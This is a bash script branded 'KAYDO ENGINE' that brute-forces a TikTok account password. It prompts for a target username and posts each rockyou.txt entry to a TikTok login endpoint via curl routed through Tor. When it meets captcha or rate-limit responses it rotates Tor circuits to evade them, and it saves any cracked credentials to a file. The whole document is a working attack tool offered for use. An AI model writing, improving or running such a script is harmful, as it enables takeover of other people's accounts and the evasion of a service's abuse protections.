#!/bin/bash

# =========================================================================================
#  ██╗  ██╗ █████╗ ██╗   ██╗██████╗  ██████╗ 
#  ██║ ██╔╝██╔══██╗╚██╗ ██╔╝██╔══██╗██╔═══██╗
#  █████╔╝ ███████║ ╚████╔╝ ██║  ██║██║   ██║
#  ██╔═██╗ ██╔══██║  ╚██╔╝  ██║  ██║██║   ██║
#  ██║  ██╗██║  ██║   ██║   ██████╔╝╚██████╔╝
#  ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝  ╚═════╝ 
# =========================================================================================
#  [ KAYDO ENGINE ]  |  [ VERSION 4.0 ]  |  [ TOR ROUTING ENABLED ]
# =========================================================================================

R='\033[1;91m'      # Red
G='\033[1;92m'      # Green
Y='\033[1;93m'      # Yellow
B='\033[1;94m'      # Blue
M='\033[1;95m'      # Magenta
C_='\033[1;96m'     # Cyan
W='\033[1;97m'      # White
RESET='\033[0m'     # Reset
CLEAR='\033[2J\033[H' # Clear Screen

# =========================================================================================
# [ MODULE 01 : SECURITY PROTOCOLS AND PRIVILEGE ESCALATION CHECK ]
# =========================================================================================
function check_privileges() {
    echo -e "${Y}[*] INITIATING SECURITY PROTOCOLS...${RESET}"
    sleep 0.5
    if [[ "$EUID" -ne 0 ]]; then
        echo -e "${R}[!] FATAL: ROOT PRIVILEGES REQUIRED.${RESET}"
        echo -e "${R}[!] EXECUTION HALTED.${RESET}"
        exit 1
    fi
    echo -e "${G}[✓] PRIVILEGE ESCALATION CONFIRMED.${RESET}"
}

# =========================================================================================
# [ MODULE 02 : TOR NETWORK CONNECTIVITY VERIFICATION ]
# =========================================================================================
function check_tor() {
    echo -e "${Y}[*] VERIFYING TOR ROUTING PROTOCOL...${RESET}"
    sleep 0.5
    if ! ss -tuln | grep -q ":9050"; then
        echo -e "${R}[!] CRITICAL: TOR PROXY NOT DETECTED ON PORT 9050.${RESET}"
        echo -e "${Y}[*] ACTION REQUIRED: sudo service tor start${RESET}"
        exit 1
    fi
    echo -e "${G}[✓] TOR NETWORK ESTABLISHED. ANONYMITY SECURED.${RESET}"
}

# =========================================================================================
# [ MODULE 03 : WORDLIST INTEGRITY CHECK ]
# =========================================================================================
function load_wordlist() {
    echo -e "${Y}[*] LOADING PAYLOAD DICTIONARY...${RESET}"
    sleep 0.5
    WORDLIST="/usr/share/wordlists/rockyou.txt"
    if [[ ! -f "$WORDLIST" ]]; then
        echo -e "${R}[!] ERROR: DICTIONARY NOT FOUND AT $WORDLIST${RESET}"
        exit 1
    fi
    TOTAL=$(wc -l < "$WORDLIST")
    echo -e "${G}[✓] DICTIONARY LOADED: ${W}$TOTAL ${G}KEYS.${RESET}"
}

# =========================================================================================
# [ MODULE 04 : NETWORK PACKET INJECTION AND RESPONSE ANALYSIS ]
# =========================================================================================
function execute_attack() {
    read -p $'\033[1;93m[?] ENTER TARGET USERNAME: \033[0m' USERNAME
    if [[ -z "$USERNAME" ]]; then
        echo -e "${R}[!] INVALID TARGET.${RESET}"
        exit 1
    fi

    echo -e "\n${C_}========================================================================================${RESET}"
    echo -e "${C_}                            INITIATING BRUTE-FORCE SEQUENCE                             ${RESET}"
    echo -e "${C_}========================================================================================${RESET}"

    COUNT=1
    START_TIME=$(date +%s)

    while IFS= read -r PASSWORD; do
        [[ -z "$PASSWORD" ]] && continue

        # شريط التقدم الوهمي
        PERCENT=$(( COUNT * 100 / TOTAL ))
        echo -ne "\r${M}[*] PROGRESS: ${W}$PERCENT% ${M}| ${C_}TARGET: ${W}$USERNAME ${M}| ${Y}ATTEMPT: ${W}$COUNT/$TOTAL ${M}| ${R}KEY: ${W}${PASSWORD:0:10}      ${RESET}"

        # إرسال الطلب
        RESPONSE=$(curl --socks5 127.0.0.1:9050 -s -X POST \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
            -d "username=$USERNAME&password=$PASSWORD" \
            "https://www.tiktok.com/api/v1/auth/login/")

        if echo "$RESPONSE" | grep -q "logged_in"; then
            echo -e "\n\n${G}========================================================================================${RESET}"
            echo -e "${G}[✓] CRITICAL SUCCESS: ACCESS GRANTED!${RESET}"
            echo -e "${G}[✓] PASSWORD IDENTIFIED: ${W}$PASSWORD${RESET}"
            echo -e "${G}========================================================================================${RESET}"
            echo "Username: $USERNAME | Password: $PASSWORD" >> kaydo_captured.txt
            exit 0
        elif echo "$RESPONSE" | grep -qi "captcha\|too many"; then
            echo -e "\n\n${R}[!] WARNING: RATE LIMIT DETECTED. ROTATING TOR CIRCUIT.${RESET}"
            killall -HUP tor
            sleep 10
        fi

        ((COUNT++))
        sleep 0.5
    done < "$WORDLIST"

    echo -e "\n\n${R}[!] SEQUENCE COMPLETE. TARGET NOT VULNERABLE TO CURRENT DICTIONARY.${RESET}"
}

# =========================================================================================
# [ MAIN EXECUTION BLOCK ]
# =========================================================================================
clear
echo -e "${R}"
cat << "EOF"
  ██╗  ██╗ █████╗ ██╗   ██╗██████╗  ██████╗ 
  ██║ ██╔╝██╔══██╗╚██╗ ██╔╝██╔══██╗██╔═══██╗
  █████╔╝ ███████║ ╚████╔╝ ██║  ██║██║   ██║
  ██╔═██╗ ██╔══██║  ╚██╔╝  ██║  ██║██║   ██║
  ██║  ██╗██║  ██║   ██║   ██████╔╝╚██████╔╝
  ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝  ╚═════╝ 
EOF
echo -e "${RESET}"
echo -e "${C_}========================================================================================${RESET}"
echo -e "${C_}  [ SYSTEM INITIALIZATION ]                                                        ${RESET}"
echo -e "${C_}========================================================================================${RESET}"

check_privileges
check_tor
load_wordlist

echo -e "\n${Y}[*] ALL SYSTEMS OPERATIONAL. AWAITING COMMAND.${RESET}"
execute_attack